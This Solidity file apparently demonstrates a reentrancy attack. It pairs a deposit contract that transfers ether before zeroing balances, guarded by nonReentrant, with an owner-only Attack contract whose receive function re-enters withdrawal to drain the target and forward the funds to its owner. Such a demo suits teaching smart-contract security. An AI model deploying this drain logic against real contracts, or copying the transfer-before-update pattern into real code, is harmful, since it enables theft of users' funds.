// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol"; 
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract EtherDeposit is ReentrancyGuard{
    using Address for address payable;

    mapping (address=>uint256) public balance;
    
    function depositEth() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdrawEth() external nonReentrant {
        payable(msg.sender).sendValue(balance[msg.sender]);
        balance[msg.sender] = 0;
    }
}

contract Attack is Ownable{
    using Address for address payable;
    EtherDeposit public ethContract;

    constructor (address _ethAddr) {
        ethContract = EtherDeposit(_ethAddr);
    }

    function attack() external payable onlyOwner {
        ethContract.depositEth{value: msg.value}();
        ethContract.withdrawEth();
    }

    receive() external payable {
        if(address(ethContract).balance > 0) {
            ethContract.withdrawEth();
            payable(owner()).transfer(address(this).balance);
        }

    }
}